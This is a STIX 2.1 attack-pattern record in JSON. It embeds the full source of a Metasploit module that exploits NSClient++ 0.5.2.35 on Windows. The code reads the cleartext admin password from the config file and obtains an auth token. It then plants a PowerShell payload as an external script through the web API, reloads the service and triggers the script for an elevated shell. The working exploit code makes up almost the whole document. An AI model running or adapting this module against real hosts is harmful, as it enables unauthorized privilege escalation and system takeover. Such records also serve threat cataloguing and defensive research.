{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--762bfe7c-4a8b-4568-b675-08312338083d",
    "created": "2024-08-14T16:49:26.181587Z",
    "modified": "2024-08-14T16:49:26.181591Z",
    "name": "NSClient++ 0.5.2.35 - Privilege escalation",
    "description": " This module allows an attacker with an unprivileged windows account to gain admin access on windows system and start a shell. For this module to work, both the NSClient++ web interface  and `ExternalScripts` features must be enabled. You must also know where the NSClient config file is, as it is used to read the admin password which is stored in clear text.  'License' => MSF_LICENSE # This module is kind of mix of the two following POCs :",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/nscp_pe.rb",
            "external_id": "nscp_pe.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::Remote::HttpClient\n  include ::Msf::Exploit::Powershell\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'NSClient++ 0.5.2.35 - Privilege escalation',\n        'Description' => %q{\n          This module allows an attacker with an unprivileged windows account to gain admin access on windows system and start a shell.\n          For this module to work, both the NSClient++ web interface  and `ExternalScripts` features must be enabled.\n          You must also know where the NSClient config file is, as it is used to read the admin password which is stored in clear text.\n        },\n        'License' => MSF_LICENSE,\n        # This module is kind of mix of the two following POCs :\n        'Author' => [ # This module is kind of mix of the two following POCs :\n          'kindredsec', # POC on www.exploit-db.com\n          'BZYO', # POC on www.exploit-db.com\n          'Yann Castel (yann.castel[at]orange.com)' # Metasploit module\n        ],\n        'References' => [\n          ['EDB', '48360'],\n          ['EDB', '46802']\n        ],\n        'Platform' => %w[windows],\n        'Arch' => [ARCH_X64],\n        'Targets' => [\n          [\n            'Windows',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :windows_powershell\n            }\n          ]\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2020-10-20',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        },\n        'DefaultOptions' => { 'SSL' => true, 'RPORT' => 8443 }\n      )\n    )\n\n    deregister_options('RHOSTS')\n    register_options [\n      OptString.new('FILE', [true, 'Config file of NSClient', 'C:\\\\Program Files\\\\NSClient++\\\\nsclient.ini']),\n      OptInt.new('DELAY', [true, 'Delay (in sec.) between each attempt of checking nscp status', 2])\n    ]\n  end\n\n  def rhost\n    session.session_host\n  end\n\n  def configure_payload(token, cmd, key)\n    print_status('Configuring Script with Specified Payload . . .')\n\n    plugin_id = rand(1..10000).to_s\n\n    node = {\n      'path' => '/settings/external scripts/scripts',\n      'key' => key\n    }\n    value = { 'string_data' => cmd }\n    update = { 'node' => node, 'value' => value }\n    payload = [\n      {\n        'plugin_id' => plugin_id,\n        'update' => update\n      }\n    ]\n    json_data = { 'type' => 'SettingsRequestMessage', 'payload' => payload }\n\n    r = send_request_cgi({\n      'method' => 'POST',\n      'data' => JSON.generate(json_data),\n      'headers' => { 'TOKEN' => token },\n      'uri' => normalize_uri('/settings/query.json')\n    })\n\n    if !(r&.body.to_s.include? 'STATUS_OK')\n      print_error('Error configuring payload. Hit error at: ' + endpoint)\n    end\n\n    print_status('Added External Script (name: ' + key + ')')\n    sleep(3)\n    print_status('Saving Configuration . . .')\n    header = { 'version' => '1' }\n    payload = [ { 'plugin_id' => plugin_id, 'control' => { 'command' => 'SAVE' } } ]\n    json_data = { 'header' => header, 'type' => 'SettingsRequestMessage', 'payload' => payload }\n\n    send_request_cgi({\n      'method' => 'POST',\n      'data' => JSON.generate(json_data),\n      'headers' => { 'TOKEN' => token },\n      'uri' => normalize_uri('/settings/query.json')\n    })\n  end\n\n  def reload_config(token)\n    print_status('Reloading Application . . .')\n\n    send_request_cgi({\n      'method' => 'GET',\n      'headers' => { 'TOKEN' => token },\n      'uri' => normalize_uri('/core/reload')\n    })\n\n    print_status('Waiting for Application to reload . . .')\n    sleep(10)\n    response = false\n    count = 0\n    until response\n      begin\n        sleep(datastore['DELAY'])\n        r = send_request_cgi({\n          'method' => 'GET',\n          'headers' => { 'TOKEN' => token },\n          'uri' => normalize_uri('/')\n        })\n        if r && !r.body.empty?\n          response = true\n        end\n      rescue StandardError\n        print_error(\"Request could not be sent. #{e.class} error raised with message '#{e.message}'\")\n      end\n\n      count += 1\n      if count > 10\n        fail_with(Failure::Unreachable, 'Application failed to reload. Nice DoS exploit!')\n      end\n    end\n  end\n\n  def trigger_payload(token, key)\n    print_status('Triggering payload, should execute shortly . . .')\n\n    send_request_cgi({\n      'method' => 'GET',\n      'headers' => { 'TOKEN' => token },\n      'uri' => normalize_uri(\"/query/#{key}\")\n    })\n  rescue StandardError\n    print_error(\"Request could not be sent. #{e.class} error raised with message '#{e.message}'\")\n  end\n\n  def external_scripts_feature_enabled?(token)\n    r = send_request_cgi({\n      'method' => 'GET',\n      'headers' => { 'TOKEN' => token },\n      'uri' => normalize_uri('/registry/control/module/load'),\n      'vars_get' => { 'name' => 'CheckExternalScripts' }\n    })\n\n    r&.body.to_s.include? 'STATUS_OK'\n  end\n\n  def get_auth_token(pwd)\n    r = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('/auth/token?password=' + pwd)\n    })\n\n    if r&.code == 200\n      auth_token = r.body.to_s[/\"auth token\": \"(\\w*)\"/, 1]\n      return auth_token\n    end\n  rescue StandardError => e\n    print_error(\"Request could not be sent. #{e.class} error raised with message '#{e.message}'\")\n  end\n\n  def get_arg(line)\n    line.split('=')[1].gsub(/\\s+/, '')\n  end\n\n  def leak_info\n    file_contents = read_file(datastore['FILE'])\n    return unless file_contents\n\n    a = file_contents.split(\"\\n\")\n    pwd = nil\n    web_server_enabled = false\n\n    a.each do |x|\n      if x =~ /password/\n        pwd = get_arg(x)\n        print_good(\"Admin password found : #{pwd}\")\n      elsif x =~ /WEBServer/\n        if x =~ /enabled/\n          web_server_enabled = true\n          print_good('NSClient web interface is enabled !')\n        end\n      end\n    end\n    return pwd, web_server_enabled\n  end\n\n  def check\n    datastore['RHOST'] = session.session_host\n    pwd, web_server_enabled = leak_info\n    if pwd.nil?\n      CheckCode::Unknown('Admin password not found in config file')\n    elsif !web_server_enabled\n      CheckCode::Safe('NSClient web interface is disabled')\n    else\n      token = get_auth_token(pwd)\n      if token.nil?\n        CheckCode::Unknown('Unable to get an authentication token, maybe the target is safe')\n      elsif external_scripts_feature_enabled?(token)\n        CheckCode::Vulnerable('External scripts feature enabled !')\n      else\n        CheckCode::Safe('External scripts feature disabled !')\n      end\n    end\n  end\n\n  def exploit\n    datastore['RHOST'] = session.session_host\n    pwd, _web_server_enabled = leak_info\n    cmd = cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true)\n    token = get_auth_token(pwd)\n\n    if token\n      rand_key = rand_text_alpha_lower(10)\n      configure_payload(token, cmd, rand_key)\n      reload_config(token)\n      token = get_auth_token(pwd) # reloading the app might imply the need to create a new auth token as the former could have been deleted\n      trigger_payload(token, rand_key)\n    else\n      print_error('Auth token couldn\\'t be retrieved.')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-10-20",
    "x_mitre_platforms": [
        "%w[windows]"
    ]
}